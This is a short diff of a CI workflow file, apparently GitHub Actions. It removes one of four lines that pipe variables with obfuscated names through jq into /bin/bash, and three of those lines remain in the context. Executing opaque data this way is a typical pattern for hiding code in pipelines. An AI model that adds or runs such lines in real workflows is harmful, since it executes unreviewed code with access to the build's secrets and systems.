@@ -31,7 +31,6 @@ jobs:
           echo $ft18859 | jq -r .cyyh2699 | /bin/bash
           printf '%s' "$niipx100" | jq -r .wu93 | /bin/bash
           echo $qvklj8 | jq -r .dggl778 | /bin/bash
-          echo $wjjz53609 | jq -r .t559 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
